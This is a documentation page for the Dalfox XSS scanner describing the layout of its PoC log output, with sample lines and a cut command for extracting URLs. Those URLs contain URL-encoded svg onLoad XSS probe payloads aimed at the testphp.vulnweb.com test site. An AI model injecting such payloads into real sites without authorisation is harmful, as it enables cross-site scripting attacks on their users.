---
title: Format Of PoC
permalink: /docs/format-of-poc/
---

This is sample of PoC log. The PoC log contains various information along with the PoC code. The distinction char between information data and PoC code is blank.
```
[POC][G][BUILT-IN/dalfox-error-mysql/GET] http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123DalFox
[POC][V][GET] http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E
```

| Identity | Type | Information                     | BLANK | PoC Code                                                     |
| -------- | ---- | ------------------------------- | ----- | ------------------------------------------------------------ |
| POC      | G    | BUILT-IN/dalfox-error-mysql/GET |       | http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123DalFox |
| POC      | R    | GET                             |       | http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E |
| POC      | V    | GET                             |       | http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E |


- Type: `G`(Grep) , `R`(Reflected) , `V`(Verify)
- Informatin: Method, grepping name, etc..

Why is there a gap?
It is a method to make it easier to parse only the poc code through cut etc. For example, you can do this.
```shell
$ dalfox url http://testphp.vulnweb.com/listproducts.php\?cat\=123\&artist\=123\&asdf\=ff | cut -d " " -f 2 > output
$ cat output
http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123DalFox
http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%22%3E%3Csvg%2FOnLoad%3D%22%60%24%7Bprompt%60%60%7D%60%22+class%3Ddalfox%3E
```
